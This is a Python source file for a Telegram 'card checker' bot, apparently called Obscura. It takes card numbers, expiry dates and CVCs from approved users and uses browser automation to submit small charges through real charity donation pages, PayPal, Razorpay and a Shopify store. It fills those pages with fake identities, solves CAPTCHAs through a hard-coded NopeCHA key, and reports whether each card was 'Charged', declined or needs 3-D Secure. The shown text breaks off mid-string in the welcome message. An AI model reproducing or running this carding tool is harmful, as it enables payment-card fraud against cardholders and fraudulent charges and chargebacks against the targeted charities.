from telegram import Update, ParseMode
from telegram.ext import Updater, CommandHandler, CallbackContext
from selenium import webdriver
from selenium.webdriver.edge.service import Service
from selenium.webdriver.edge.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.proxy import Proxy, ProxyType
from faker import Faker
import time
from colorama import init, Fore, Style
import requests
import selenium
import json
import string
import os
import threading
import logging
import random
import nopecha
from requests.auth import HTTPProxyAuth

nopecha.api_key = 'sub_1P70HTCRwBwvt6ptLlvvMWOv'



# Initialize colorama for colored output
init(autoreset=True)

APPROVED_USERS_FILE = 'approved_users.json'
ADMIN_USER_ID = [5457445535,5737829871,5589703594,1068646598,660344203,1131430680,1047973309]

def send_ping():
    bot_token = 'BOT TOKEN'
    while True:
        try:
            response = requests.get(f'https://api.telegram.org/bot{bot_token}/getMe')
            if response.status_code == 200:
                print("Ping successful")
            else:
                print(f"Ping failed with status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Ping failed: {e}")
        time.sleep(20)

def c_web():
    driver_path = 'C:\\Users\\vnx\\Desktop\\msedgedriver.exe'
    options = Options()
    #options.add_argument('--headless')  # Headless mode for reduced resource usage
    #options.add_argument('--disable-gpu')
    #options.add_argument('--window-size=1920,1080')
    service = Service(driver_path)
    return webdriver.Edge(service=service, options=options)

# Function to load approved users from file
def load_approved_users():
    try:
        with open(APPROVED_USERS_FILE, 'r') as file:
            return json.load(file)
    except FileNotFoundError:
        return []

# Function to save approved users to file
def save_approved_users(approved_users):
    with open(APPROVED_USERS_FILE, 'w') as file:
        json.dump(approved_users, file)

# Load approved users at the start
approved_users = load_approved_users()

# Function to convert credit card details from string to dictionary
def convert_cc_details(line):
    line = line.replace("/", "|")
    cc_number, exp_month, exp_year, cvc = line.split("|")
    # Check if the exp_year is a four-digit number
    if len(exp_year) == 4:
        exp_year = exp_year[2:]  # Get the last two digits
    exp = f"{exp_month}{exp_year}"
    return {
        'cc_number': cc_number,
        'exp': exp,
        'cvc': cvc,
        'first_name': 'First',
        'last_name': 'Last',
        'email': 'example@example.com'
    }

# Function to fetch BIN details
def fetch_bin_details(bin_number):
    response = requests.get(f"https://data.handyapi.com/bin/{bin_number}")
    if response.status_code == 200:
        data = response.json()
        return {
            'Scheme': data.get('Scheme', 'N/A'),
            'Type': data.get('Type', 'N/A'),
            'Issuer': data.get('Issuer', 'N/A'),
            'Card Tier': data.get('CardTier', 'N/A'),
            'Country': data['Country'].get('Name', 'N/A') if 'Country' in data else 'N/A'
        }
    else:
        return {'Scheme': 'N/A', 'Type': 'N/A', 'Issuer': 'N/A', 'Card Tier': 'N/A', 'Country': 'N/A'}

# Function to generate the progress bar
def generate_progress_bar(progress, total=100, length=20):
    filled_length = int(length * progress // total)
    bar = '█' * filled_length + '-' * (length - filled_length)
    return f"|{bar}| {progress}%"

# Function to process the credit card and send updates to the Telegram bot
def process_credit_card(update: Update, context: CallbackContext, card_details):
    fake = Faker()
    driver=c_web()
    url = 'https://afrimednetwork.org/donation-2/'
    a=str(card_details['exp'])

    random_name = fake.name()
    random_email = fake.email()
    full_cc_details = f"{card_details['cc_number']}|{a[:2]}|{a[2:]}|{card_details['cvc']}"
    bin_number = card_details['cc_number'][:6]
    bin_details = fetch_bin_details(bin_number)

    initial_message_template = """
🔐 *Gateway:* Stripe 10 $ Charge

🚀 *Progress:* {progress}

🤖 *Bot by:* @Dwoscloud
    """

    final_message_template = f"""
🔐 *Gateway:* Stripe 10 $ Charge

💳 *CC:* `{full_cc_details}`

📋 *Issuer:* `{bin_details['Issuer']}`

📊 *Result:* {{result}}

🤖 *Bot by:* @Dwoscloud
    """

    # Send initial message
    progress_message = update.message.reply_text(
        initial_message_template.format(progress=generate_progress_bar(0)), parse_mode=ParseMode.MARKDOWN)

    try:
        progress = 0
        last_progress_text = ""

        def update_progress(step, result="Pending..."):
            nonlocal progress, last_progress_text
            progress += step
            new_progress_text = initial_message_template.format(progress=generate_progress_bar(progress))
            if new_progress_text != last_progress_text:
                progress_message.edit_text(new_progress_text, parse_mode=ParseMode.MARKDOWN)
                last_progress_text = new_progress_text

        driver.get(url)
        update_progress(10)
        time.sleep(1)

        stripe_radio_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="give-gateway-stripe-3098-1"]'))
        )
        stripe_radio_button.click()
        update_progress(10)
        time.sleep(1)

        driver.find_element(By.XPATH, '//input[@placeholder="First Name"]').send_keys(random_name.split()[0])
        driver.find_element(By.XPATH, '//input[@placeholder="Last Name"]').send_keys(random_name.split()[-1])
        driver.find_element(By.XPATH, '//input[@placeholder="Email Address"]').send_keys(random_email)
        update_progress(10)
        time.sleep(1)

        cc_iframe = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//iframe[contains(@src, 'stripe.com')]"))
        )
        driver.switch_to.frame(cc_iframe)
        driver.find_element(By.XPATH, '//input[@placeholder="Card Number"]').send_keys(card_details['cc_number'])
        driver.switch_to.default_content()
        update_progress(10)
        time.sleep(1)

        exp_iframe = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH,
                                            "//iframe[contains(@src, 'stripe.com') and @title='Secure expiration date input frame']"))
        )
        driver.switch_to.frame(exp_iframe)
        driver.find_element(By.XPATH, '//input[@placeholder="MM / YY"]').send_keys(card_details['exp'])
        driver.switch_to.default_content()
        update_progress(10)
        time.sleep(1)

        cvc_iframe = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located(
                (By.XPATH, "//iframe[contains(@src, 'stripe.com') and @title='Secure CVC input frame']"))
        )
        driver.switch_to.frame(cvc_iframe)
        driver.find_element(By.XPATH, '//input[@placeholder="CVC"]').send_keys(card_details['cvc'])
        driver.switch_to.default_content()
        update_progress(10)
        time.sleep(1)

        driver.find_element(By.XPATH, '//input[@placeholder="Cardholder Name"]').send_keys(random_name)
        update_progress(10)
        time.sleep(1)

        try:
            cookie_notice = WebDriverWait(driver, 5).until(
                EC.element_to_be_clickable((By.XPATH, '//*[@id="cn-accept-cookie"]'))
            )
            cookie_notice.click()
        except:
            pass
        update_progress(10)
        time.sleep(1)

        submit_button = driver.find_element(By.XPATH, '//*[@id="give-purchase-button"]')
        driver.execute_script("arguments[0].scrollIntoView(true);", submit_button)
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//*[@id="give-purchase-button"]'))
        )
        try:
            submit_button.click()
        except selenium.common.exceptions.ElementClickInterceptedException:
            driver.execute_script("arguments[0].click();", submit_button)
        update_progress(10)

        WebDriverWait(driver, 20).until(
            EC.url_changes(url)
        )
        time.sleep(5)

        error_elements = driver.find_elements(By.XPATH,
                                              "//*[contains(text(), 'Your card was declined') or contains(text(), 'incorrect')]")
        if error_elements:
            for element in error_elements:
                result = f"❌ {element.text}"
        else:
            result = "✅ Charged"

        # Update the message with the result
        progress_message.edit_text(final_message_template.format(result=result), parse_mode=ParseMode.MARKDOWN)
        #print(full_cc_details,"Result : ",result," Gateway : Stripe")
    finally:
        driver.quit()

def cc_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in approved_users:
        update.message.reply_text("You are not authorized to use this bot.")
        return

    card_details_string = ' '.join(context.args)
    card_details = convert_cc_details(card_details_string)
    threading.Thread(target=process_credit_card, args=(update, context, card_details)).start()

# Function to process DonateKart payment
def process_donatekart_payment(update: Update, context: CallbackContext, card_details):
    fake = Faker()
    driver = c_web()
    random_name = fake.name()
    random_email = fake.email()
    ex1=str(card_details['exp'])
    full_cc_details = f"{card_details['cc_number']}|{ex1[:2]}|{ex1[2:]}|{card_details['cvc']}"
    bin_number = card_details['cc_number'][:6]
    bin_details = fetch_bin_details(bin_number)

    initial_message_template = """
🔐 *Gateway:* Razorpay 100 INR Charge

🚀 *Progress:* {progress}

🤖 *Bot by:* @Dwoscloud
    """

    final_message_template = f"""
🔐 *Gateway:* Razorpay 100 INR Charge

💳 *CC:* `{full_cc_details}`

📋 *Issuer:* `{bin_details['Issuer']}`

📊 *Result:* {{result}}

🤖 *Bot by:* @Dwoscloud
    """

    # Send initial message
    progress_message = update.message.reply_text(
        initial_message_template.format(progress=generate_progress_bar(0)), parse_mode=ParseMode.MARKDOWN)

    try:
        progress = 0
        last_progress_text = ""

        # Updating progress function
        def update_progress(step, result="Pending..."):
            nonlocal progress, last_progress_text
            progress += step
            new_progress_text = initial_message_template.format(progress=generate_progress_bar(progress))
            if new_progress_text != last_progress_text:
                progress_message.edit_text(new_progress_text, parse_mode=ParseMode.MARKDOWN)
                last_progress_text = new_progress_text

        driver.get('https://www.donatekart.com/gift-card/create')
        update_progress(10)
        time.sleep(1)

        WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.CLASS_NAME, 'info_amount__2H3A1'))
        )
        amount_input = driver.find_element(By.CLASS_NAME, 'info_amount__2H3A1')
        amount_input.clear()
        amount_input.send_keys('100')
        proceed_button = driver.find_element(By.XPATH, '//*[@id="__next"]/main/div/section[2]/div/div[2]/div/div[2]/input')
        proceed_button.click()
        update_progress(10)
        time.sleep(1)

        WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.ID, 'receiverName_1'))
        )
        driver.find_element(By.ID, 'receiverName_1').send_keys(random_name.split()[0])
        driver.find_element(By.ID, 'email_1').send_keys(random_email)
        driver.find_element(By.ID, 'senderName_1').send_keys(random_name.split()[-1])
        continue_button = driver.find_element(By.CLASS_NAME, 'receivers-info_checkoutBtn__2gyJE')
        continue_button.click()
        update_progress(10)
        time.sleep(1)

        WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.ID, 'guestName'))
        )
        driver.find_element(By.ID, 'guestName').send_keys(random_name)
        driver.find_element(By.ID, 'guestEmail').send_keys(random_email)
        driver.find_element(By.ID, 'billingPhone').send_keys('8865366921')
        time.sleep(3)
        continue_to_pay_button = driver.find_element(By.ID, 'btnGuestCheckout')
        continue_to_pay_button.click()
        update_progress(10)
        time.sleep(1)

        WebDriverWait(driver, 20).until(
            EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, 'iframe'))
        )
        payment_options_xpath = '//*[@id="form-common"]/div[1]/div[1]/div/div/div[2]/div/button[2]'
        WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, payment_options_xpath))
        )
        card_option = driver.find_element(By.XPATH, payment_options_xpath)
        driver.execute_script("arguments[0].scrollIntoView();", card_option)
        card_option.click()
        update_progress(10)
        time.sleep(1)

        card_number = driver.find_element(By.XPATH, '//*[@id="card_number"]')
        card_expiry = driver.find_element(By.XPATH, '//*[@id="card_expiry"]')
        card_cvv = driver.find_element(By.XPATH, '//*[@id="card_cvv"]')
        card_number.send_keys(card_details['cc_number'])
        card_expiry.send_keys(card_details['exp'])
        card_cvv.send_keys(card_details['cvc'])
        time.sleep(3)
        pay_now_button = driver.find_element(By.XPATH, '//*[@id="redesign-v15-cta"]')
        pay_now_button.click()
        update_progress(10)
        time.sleep(1)

        pay_without_saving_xpath = '//*[@id="overlay"]/div/div/button[2]'
        WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, pay_without_saving_xpath))
        )
        pay_without_saving_button = driver.find_element(By.XPATH, pay_without_saving_xpath)
        pay_without_saving_button.click()
        update_progress(10)
        time.sleep(1)

        for _ in range(30):  # Check for up to 30 seconds
            current_url = driver.current_url
            if "failed" in current_url:
                result = "❌ Declined"
                break
            elif "success" in current_url:
                result = "✅ Charged"
                break
            else:
                result = "⚠️ CCN"
                break
        else:
            result = "⚠️ CCN"
            a1 = f'{full_cc_details},"Result : ",{result}," Gateway : Razorpay'
            with open('charge.txt', 'a') as q:
                q.writelines(a1)
            q.close()

        progress_message.edit_text(final_message_template.format(result=result), parse_mode=ParseMode.MARKDOWN)
        #print(full_cc_details, "Result : ", result, " Gateway : Razorpay")
    finally:
        driver.quit()

# Define the /donatekart command handler
def donatekart_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in approved_users:
        update.message.reply_text("You are not authorized to use this bot.")
        return

    card_details_string = ' '.join(context.args)
    card_details = convert_cc_details(card_details_string)
    threading.Thread(target=process_donatekart_payment, args=(update, context, card_details)).start()

# Define the /approve command handler
def approve_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in ADMIN_USER_ID:
        update.message.reply_text("You are not authorized to use this command.")
        return

    if len(context.args) != 1:
        update.message.reply_text("Usage: /approve <user_id>")
        return

    try:
        approve_user_id = int(context.args[0])
        if approve_user_id not in approved_users:
            approved_users.append(approve_user_id)
            save_approved_users(approved_users)
            update.message.reply_text(f"User {approve_user_id} has been approved.")
        else:
            update.message.reply_text(f"User {approve_user_id} is already approved.")
    except ValueError:
        update.message.reply_text("Invalid user ID.")

def revoke_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in ADMIN_USER_ID:
        update.message.reply_text("You are not authorized to use this command.")
        return

    if len(context.args) != 1:
        update.message.reply_text("Usage: /revoke <user_id>")
        return

    try:
        revoke_user_id = int(context.args[0])
        if revoke_user_id in approved_users:
            approved_users.remove(revoke_user_id)
            save_approved_users(approved_users)
            update.message.reply_text(f"User {revoke_user_id} has been revoked.")
        else:
            update.message.reply_text(f"User {revoke_user_id} is not approved.")
    except ValueError:
        update.message.reply_text("Invalid user ID.")

# Function to process PayPal donations
def process_paypal_donation(update: Update, context: CallbackContext, card_details):
    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger(__name__)
    driver = c_web()

    bin_number = card_details['cc_number'][:6]
    bin_details = fetch_bin_details(bin_number)
    jp = card_details['exp']

    initial_message_template = """
🔐 *Gateway:* PayPal 1 $ Charge

🚀 *Progress:* {progress}

🤖 *Bot by:* @Dwoscloud
    """

    final_message_template = f"""
🔐 *Gateway:* PayPal 1 $ Charge

💳 *CC:* `{card_details['cc_number']}|{jp[:2]}|{jp[2:]}|{card_details['cvc']}`

📋 *Issuer:* `{bin_details['Issuer']}`

📊 *Result:* {{result}}

🤖 *Bot by:* @Dwoscloud
    """

    # Send initial message
    progress_message = update.message.reply_text(
        initial_message_template.format(progress=generate_progress_bar(0)), parse_mode=ParseMode.MARKDOWN)

    try:
        progress = 0
        last_progress_text = ""

        def update_progress(step, result="Pending..."):
            nonlocal progress, last_progress_text
            progress += step
            new_progress_text = initial_message_template.format(progress=generate_progress_bar(progress))
            if new_progress_text != last_progress_text:
                progress_message.edit_text(new_progress_text, parse_mode=ParseMode.MARKDOWN)
                last_progress_text = new_progress_text

        # Function to generate a random valid US address
        def generate_random_us_address():
            streets = ["Main St", "Second St", "Third St", "Fourth St", "Fifth St"]
            cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
            states = ["NY", "CA", "IL", "TX", "AZ"]
            address = {
                "street": f"{random.randint(100, 999)} {random.choice(streets)}",
                "city": random.choice(cities),
                "state": random.choice(states),
                "zip_code": f"{random.randint(10000, 99999)}",
                "phone_number": f"{random.randint(100, 999)}-{random.randint(100, 999)}-{random.randint(1000, 9999)}",
            }
            return address

        address = generate_random_us_address()

        update_progress(10)
        time.sleep(1)

        logger.info("Opening the website")
        driver.get('https://www.marssociety.org/donate/')  # Replace with the actual URL of your website

        update_progress(10)
        time.sleep(1)

        logger.info("Waiting for the yellow donate button to be clickable")
        yellow_donate_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//input[@alt="PayPal - The safer, easier way to pay online!"]'))
        )
        yellow_donate_button.click()

        update_progress(10)
        time.sleep(1)

        logger.info("Switching to the new tab")
        driver.switch_to.window(driver.window_handles[1])

        update_progress(10)
        time.sleep(10)

        logger.info("Locating the amount input field")
        amount_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'text-input-myHeroCurrency'))
        )
        amount_field.clear()
        amount_field.send_keys('5')

        update_progress(10)
        time.sleep(1)

        # Wait for the "Donate with Debit or Credit Card" button to be clickable and click it
        logger.info("Waiting for the 'Donate with Debit or Credit Card' button to be clickable")
        debit_credit_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//button[contains(text(), "Donate with Debit or Credit Card")]'))
        )
        debit_credit_button.click()

        update_progress(10)
        time.sleep(1)
        if driver.find_elements(By.CSS_SELECTOR, 'iframe[title="recaptcha challenge"]'):
            logger.info("Captcha found, solving using NopeCHA")
            captcha_solver = nopecha.CaptchaSolver()

            driver.switch_to.frame(driver.find_element(By.CSS_SELECTOR, 'iframe[title="recaptcha challenge"]'))


            captcha_solution = captcha_solver.solve(driver.page_source, site_key='YOUR_SITE_KEY',
                                                    url=driver.current_url)


            captcha_input = driver.find_element(By.CSS_SELECTOR, 'input[type="text"]')
            captcha_input.send_keys(captcha_solution)
            captcha_input.send_keys(Keys.ENTER)


            driver.switch_to.default_content()
            time.sleep(6)

        logger.info("Waiting for the card number input field")
        card_number_field = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, 'cardData_cardNumber'))
        )

        try:
            logger.info("Closing the cookie notice")
            cookie_close_button = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.ID, 'acceptAllButton'))
            )
            cookie_close_button.click()
        except Exception as e:
            logger.warning("Cookie notice not found or not clickable. Continuing without closing it.")

        update_progress(10)
        time.sleep(1)

        # Fill out the form with the provided and random details
        card_number_field.send_keys(card_details['cc_number'])

        expiry_field = driver.find_element(By.ID, 'cardData_expiryDate')
        expiry_field.send_keys(card_details['exp'])

        cvv_field = driver.find_element(By.ID, 'cardData_csc')
        cvv_field.send_keys(card_details['cvc'])

        def generate_random_first_name():
            first_names = [
                'James', 'Mary', 'John', 'Patricia', 'Robert', 'Jennifer', 'Michael', 'Linda', 'William', 'Elizabeth',
                'David', 'Barbara',
                'Richard', 'Susan', 'Joseph', 'Jessica', 'Thomas', 'Sarah', 'Charles', 'Karen', 'Christopher', 'Nancy',
                'Daniel', 'Lisa',
                'Matthew', 'Betty', 'Anthony', 'Margaret', 'Donald', 'Sandra', 'Mark', 'Ashley', 'Paul', 'Kimberly',
                'Steven', 'Emily',
                'George', 'Donna', 'Kenneth', 'Michelle', 'Andrew', 'Dorothy', 'Joshua', 'Carol', 'Kevin', 'Amanda',
                'Brian', 'Melissa',
                'Edward', 'Deborah', 'Ronald', 'Stephanie', 'Timothy', 'Rebecca', 'Jason', 'Sharon', 'Jeffrey', 'Laura',
                'Ryan', 'Cynthia',
                'Jacob', 'Kathleen', 'Gary', 'Amy', 'Nicholas', 'Shirley', 'Eric', 'Angela', 'Jonathan', 'Helen',
                'Stephen', 'Anna',
                'Larry', 'Brenda', 'Justin', 'Pamela', 'Scott', 'Nicole', 'Brandon', 'Samantha', 'Frank', 'Katherine',
                'Benjamin', 'Emma',
                'Gregory', 'Ruth', 'Samuel', 'Christine', 'Raymond', 'Catherine', 'Patrick', 'Debra', 'Alexander',
                'Rachel', 'Jack', 'Carolyn',
                'Dennis', 'Janet', 'Jerry', 'Virginia', 'Tyler', 'Maria', 'Aaron', 'Heather', 'Henry', 'Diane',
                'Douglas', 'Julie'
            ]
            return random.choice(first_names)

        def generate_random_last_name():
            last_names = [
                'Smith', 'Johnson', 'Williams', 'Jones', 'Brown', 'Davis', 'Miller', 'Wilson', 'Moore', 'Taylor',
                'Anderson', 'Thomas',
                'Jackson', 'White', 'Harris', 'Martin', 'Thompson', 'Garcia', 'Martinez', 'Robinson', 'Clark',
                'Rodriguez', 'Lewis',
                'Lee', 'Walker', 'Hall', 'Allen', 'Young', 'Hernandez', 'King', 'Wright', 'Lopez', 'Hill', 'Scott',
                'Green', 'Adams',
                'Baker', 'Gonzalez', 'Nelson', 'Carter', 'Mitchell', 'Perez', 'Roberts', 'Turner', 'Phillips',
                'Campbell', 'Parker',
                'Evans', 'Edwards', 'Collins', 'Stewart', 'Sanchez', 'Morris', 'Rogers', 'Reed', 'Cook', 'Morgan',
                'Bell', 'Murphy',
                'Bailey', 'Rivera', 'Cooper', 'Richardson', 'Cox', 'Howard', 'Ward', 'Torres', 'Peterson', 'Gray',
                'Ramirez', 'James',
                'Watson', 'Brooks', 'Kelly', 'Sanders', 'Price', 'Bennett', 'Wood', 'Barnes', 'Ross', 'Henderson',
                'Coleman', 'Jenkins',
                'Perry', 'Powell', 'Long', 'Patterson', 'Hughes', 'Flores', 'Washington', 'Butler', 'Simmons', 'Foster',
                'Gonzales',
                'Bryant', 'Alexander', 'Russell', 'Griffin', 'Diaz', 'Hayes'
            ]
            return random.choice(last_names)

        random_first_name = generate_random_first_name()
        random_last_name = generate_random_last_name()

        first_name_field = driver.find_element(By.ID, 'paypalAccountData_firstName')
        first_name_field.send_keys(random_first_name)


        last_name_field = driver.find_element(By.ID, 'paypalAccountData_lastName')
        last_name_field.send_keys(random_last_name)

        update_progress(10)
        time.sleep(1)

        logger.info("Entering street address and selecting from the dropdown")
        street_address_field = driver.find_element(By.XPATH, '//*[@id="paypalAccountData_address1_0"]')
        street_address_field.clear()
        street_address_field.send_keys(address['street'])

        time.sleep(2)

        street_address_field.send_keys(Keys.ARROW_DOWN)
        street_address_field.send_keys(Keys.ENTER)
        time.sleep(5)

        def generate_random_us_phone_number():
            area_code = random.choice([
                201, 202, 203, 205, 206, 207, 208, 209, 210, 212, 213, 214, 215, 216, 217, 218, 219, 224, 225, 228, 229,
                231, 234, 239,
                240, 248, 251, 252, 253, 254, 256, 260, 262, 267, 269, 270, 272, 276, 281, 301, 302, 303, 304, 305, 307,
                308, 309, 310,
                312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 323, 325, 330, 331, 334, 336, 337, 339, 346, 347, 351,
                352, 360, 361,
                385, 386, 401, 402, 404, 405, 406, 407, 408, 409, 410, 412, 413, 414, 415, 417, 419, 423, 424, 425, 430,
                432, 434, 435,
                440, 442, 443, 469, 470, 475, 478, 479, 480, 484, 501, 502, 503, 504, 505, 507, 508, 509, 510, 512, 513,
                515, 516, 517,
                518, 520, 530, 531, 534, 539, 540, 541, 551, 559, 561, 562, 563, 567, 570, 571, 573, 574, 575, 580, 585,
                586, 601, 602,
                603, 605, 606, 607, 608, 609, 610, 612, 614, 615, 616, 617, 618, 619, 620, 623, 626, 628, 629, 630, 631,
                636, 641, 646,
                650, 651, 657, 660, 661, 662, 667, 669, 678, 681, 682, 701, 702, 703, 704, 706, 707, 708, 712, 713, 714,
                715, 716, 717,
                718, 719, 720, 724, 725, 727, 731, 732, 734, 737, 740, 743, 747, 754, 757, 760, 762, 763, 765, 769, 770,
                772, 773, 774,
                775, 779, 781, 785, 786, 801, 802, 803, 804, 805, 806, 808, 810, 812, 813, 814, 815, 816, 817, 818, 828,
                830, 831, 832,
                843, 845, 847, 848, 850, 854, 856, 857, 858, 859, 860, 862, 863, 864, 865, 870, 872, 878, 901, 903, 904,
                906, 907, 908,
                909, 910, 912, 913, 914, 915, 916, 917, 918, 919, 920, 925, 927, 928, 929, 930, 931, 934, 936, 937, 938,
                940, 941, 947,
                949, 951, 952, 954, 956, 959, 970, 971, 972, 973, 975, 978, 979, 980, 984, 985, 989
            ])
            central_office_code = random.randint(200, 999)
            station_code = random.randint(1000, 9999)
            phone_number = f"({area_code}) {central_office_code}-{station_code}"
            return phone_number

        random_us_phone_number = generate_random_us_phone_number()
        phone_field = driver.find_element(By.ID, 'paypalAccountData_phone')
        phone_field.send_keys(str(random_us_phone_number))
        time.sleep(3)

        def generate_random_gmail_id():
            username_length = random.randint(6, 12)
            username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=username_length))
            domain = "@gmail.com"
            email_id = username + domain
            return email_id

        random_gmail_id = generate_random_gmail_id()

        email_field = driver.find_element(By.ID, 'paypalAccountData_email')
        email_field.send_keys(random_gmail_id)

        update_progress(10)
        time.sleep(1)

        initial_url = driver.current_url

        logger.info("Waiting for the 'Donate Now' button to be clickable")
        donate_now_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, 'guestPaymentBtn'))
        )
        donate_now_button.click()

        update_progress(10)
        time.sleep(10)

        current_url = driver.current_url
        if current_url == initial_url:
            result = "⚠️ 3Ds Activated : Otp Detected [ Further Action Needed ] "
        else:
            # Check for payment confirmation or error message
            try:
                error_message = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.XPATH, '//div[@role="alert"]'))
                )
                result = f"❌ {error_message.text}"
            except Exception:
                try:
                    confirmation_message = WebDriverWait(driver, 10).until(
                        EC.presence_of_element_located((By.XPATH, '//div[contains(text(), "You\'ll donate")]'))
                    )
                    result = "✅ Approved Card : Added to Account "
                except Exception as e:
                    result = "✅ Payment processed successfully. Charged."

        progress_message.edit_text(final_message_template.format(result=result), parse_mode=ParseMode.MARKDOWN)
        print(card_details, "Result : ", result, " Gateway : PAYPAL")
    finally:
        driver.quit()

def pp_command(update: Update, context: CallbackContext):
    user_id = update.message.from_user.id
    if user_id not in approved_users:
        update.message.reply_text("You are not authorized to use this bot.")
        return

    card_details_string = ' '.join(context.args)
    card_details = convert_cc_details(card_details_string)
    threading.Thread(target=process_paypal_donation, args=(update, context, card_details)).start()


def process_shopify_payment(update: Update, context: CallbackContext, card_details):
    fake = Faker()
    driver = c_web()
    url = 'https://illinoischapteraap.myshopify.com/products/white-11oz-ceramic-mug'
    a = str(card_details['exp'])

    random_name = fake.name()
    random_email = fake.email()
    full_cc_details = f"{card_details['cc_number']}|{a[:2]}|{a[2:]}|{card_details['cvc']}"
    bin_number = card_details['cc_number'][:6]
    bin_details = fetch_bin_details(bin_number)

    initial_message_template = """
🔐 *Gateway:* Shopify 15$ Gateway

🚀 *Progress:* {progress}

🤖 *Bot by:* @Dwoscloud
    """

    final_message_template = f"""
🔐 *Gateway:* Shopify 15$ Gateway

💳 *CC:* `{full_cc_details}`

📋 *Issuer:* `{bin_details['Issuer']}`

📊 *Result:* {{result}}

🤖 *Bot by:* @Dwoscloud
    """

    progress_message = update.message.reply_text(
        initial_message_template.format(progress=generate_progress_bar(0)), parse_mode=ParseMode.MARKDOWN)

    try:
        progress = 0
        last_progress_text = ""

        def update_progress(step, result="Pending..."):
            nonlocal progress, last_progress_text
            progress += step
            new_progress_text = initial_message_template.format(progress=generate_progress_bar(progress))
            if new_progress_text != last_progress_text:
                progress_message.edit_text(new_progress_text, parse_mode=ParseMode.MARKDOWN)
                last_progress_text = new_progress_text

        driver.get(url)
        update_progress(10)
        time.sleep(3)

        more_payment_options = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, '.shopify-payment-button__more-options'))
        )
        more_payment_options.click()
        update_progress(10)
        time.sleep(3)

        email_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'email')))
        email_field.send_keys(random_email)

        first_name_field = driver.find_element(By.ID, 'TextField0')
        first_name_field.send_keys(random_name.split()[0])

        last_name_field = driver.find_element(By.ID, 'TextField1')
        last_name_field.send_keys(random_name.split()[-1])

        address_field = driver.find_element(By.ID, 'shipping-address1')
        address_field.send_keys("123")
        time.sleep(3)

        address_field.send_keys(Keys.ARROW_DOWN)
        address_field.send_keys(Keys.ENTER)
        time.sleep(5)
        update_progress(10)

        # Switch to iframe for CC number
        iframe_number = driver.find_element(By.CSS_SELECTOR, 'iframe[title="Field container for: Card number"]')
        driver.switch_to.frame(iframe_number)
        cc_number_field = driver.find_element(By.ID, 'number')
        cc_number_field.send_keys(card_details['cc_number'])
        driver.switch_to.default_content()
        update_progress(10)
        time.sleep(1)

        iframe_expiry = driver.find_element(By.CSS_SELECTOR, 'iframe[title="Field container for: Expiration date (MM / YY)"]')
        driver.switch_to.frame(iframe_expiry)
        cc_expiry_field = driver.find_element(By.ID, 'expiry')
        for char in card_details['exp']:
            cc_expiry_field.send_keys(char)
            time.sleep(0.2)
        driver.switch_to.default_content()
        update_progress(10)
        time.sleep(1)

        iframe_cvv = driver.find_element(By.CSS_SELECTOR, 'iframe[title="Field container for: Security code"]')
        driver.switch_to.frame(iframe_cvv)
        cc_cvv_field = driver.find_element(By.ID, 'verification_value')
        cc_cvv_field.send_keys(card_details['cvc'])
        driver.switch_to.default_content()
        update_progress(10)
        time.sleep(1)

        # Switch to iframe for Name on card
        iframe_name = driver.find_element(By.CSS_SELECTOR, 'iframe[title="Field container for: Name on card"]')
        driver.switch_to.frame(iframe_name)
        #cc_name_field = driver.find_element(By.ID, 'name')
        #cc_name_field.send_keys(random_name)
        driver.switch_to.default_content()
        update_progress(10)
        time.sleep(1)

        checkout_button = driver.find_element(By.ID, 'checkout-pay-button')
        driver.execute_script("arguments[0].scrollIntoView(true);", checkout_button)
        WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.ID, 'checkout-pay-button'))
        )
        try:
            checkout_button.click()
        except selenium.common.exceptions.ElementClickInterceptedException:
            driver.execute_script("arguments[0].click();", checkout_button)
        update_progress(10)

        WebDriverWait(driver, 20).until(
            EC.url_changes(url)
        )
        time.sleep(15)

        error_message = driver.find_elements(By.ID, 'PaymentErrorBanner')
        if error_message:
            result = f"❌ {error_message[0].text}"
        else:
            iframe_3ds = driver.find_elements(By.CSS_SELECTOR, 'iframe[src*="stripe/authentications"]')
            if iframe_3ds:
                result = "⚠️Live :  3Ds OTP Required"
            else:
                result = "✅ Order processed successfully."

        # Update the message with the result
        progress_message.edit_text(final_message_template.format(result=result), parse_mode=ParseMode.MARKDOWN)
        #print(full_cc_details, "Result:", result, "Gateway: Shopify")

    finally:
        driver.quit()

def start(update: Update, context: CallbackContext) -> None:
    welcome_message = (
        "🎉 Welcome to Obscura! 😎\n\n"
        "🚀 Glad you made it here!** Obscura is all about speed and efficiency, just like the legendary Obito. "
